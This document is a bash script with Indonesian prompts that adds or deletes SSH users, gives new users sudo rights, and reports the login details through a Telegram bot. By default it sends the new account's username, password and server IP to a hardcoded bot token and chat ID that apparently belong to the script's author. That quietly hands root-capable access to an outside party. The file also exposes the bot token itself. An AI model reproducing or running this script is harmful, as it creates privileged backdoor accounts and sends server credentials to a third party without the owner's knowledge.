send_telegram_message() {
    local MESSAGE=$1
    local INLINE_KEYBOARD='{"inline_keyboard":[[{"text":"Powered By","url":"https://t.me/NorSodikin"}]]}'
    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
        -d chat_id="${CHAT_ID}" \
        -d text="${MESSAGE}" \
        -d parse_mode=Markdown \
        -d reply_markup="${INLINE_KEYBOARD}"
    clear
}

generate_random_string() {
    local LENGTH=$1
    < /dev/urandom tr -dc A-Za-z0-9 | head -c "${LENGTH}"
}

echo "Pilih aksi: add atau delete"
read -r ACTION

if [[ "$ACTION" != "add" && "$ACTION" != "delete" ]]; then
    echo "Aksi tidak valid. Silakan pilih 'add' atau 'delete'."
    exit 1
fi

echo "Masukkan Bot Token (atau tekan Enter untuk menggunakan default):"
read -r BOT_TOKEN
BOT_TOKEN=${BOT_TOKEN:-"7419614345:AAFwmSvM0zWNaLQhDLidtZ-B9Tzp-aVWICA"}

echo "Masukkan Chat ID (atau tekan Enter untuk menggunakan default):"
read -r CHAT_ID
CHAT_ID=${CHAT_ID:-1964437366}

if [[ "$ACTION" == "add" ]]; then
    echo "Masukkan Nama Pengguna SSH (atau tekan Enter untuk menghasilkan nama pengguna acak):"
    read -r SSH_USERNAME
    SSH_USERNAME=${SSH_USERNAME:-$(generate_random_string 8)}

    echo "Masukkan Kata Sandi SSH (atau tekan Enter untuk menghasilkan kata sandi acak):"
    read -r SSH_PASSWORD
    SSH_PASSWORD=${SSH_PASSWORD:-$(generate_random_string 12)}

    if id "${SSH_USERNAME}" &>/dev/null; then
        MESSAGE="Pengguna ${SSH_USERNAME} sudah ada. Silakan pilih nama pengguna yang berbeda."
    else
        sudo adduser --disabled-password --gecos "" "${SSH_USERNAME}" --force-badname
        echo "${SSH_USERNAME}:${SSH_PASSWORD}" | sudo chpasswd
        sudo usermod -aG sudo "${SSH_USERNAME}"

        HOSTNAME=$(hostname -I | cut -d' ' -f1)
        MESSAGE="*Informasi login SSH:*\n\n*Nama Pengguna:* ${SSH_USERNAME}\n*Kata Sandi:* ${SSH_PASSWORD}\n*Hostname:* ${HOSTNAME}\n\n_Gunakan informasi di atas untuk terhubung menggunakan PuTTY atau klien SSH lainnya._"
    fi

elif [[ "$ACTION" == "delete" ]]; then
    echo "Masukkan Nama Pengguna SSH yang akan dihapus:"
    read -r SSH_USERNAME

    if ! id "${SSH_USERNAME}" &>/dev/null; then
        MESSAGE="Pengguna ${SSH_USERNAME} tidak ada."
    else
        sudo usermod --expiredate 1 "${SSH_USERNAME}"
        sudo deluser --remove-home "${SSH_USERNAME}"
        MESSAGE="Pengguna ${SSH_USERNAME} telah dihapus dari sistem dan tidak dapat lagi masuk."
    fi
fi

send_telegram_message "${MESSAGE}"
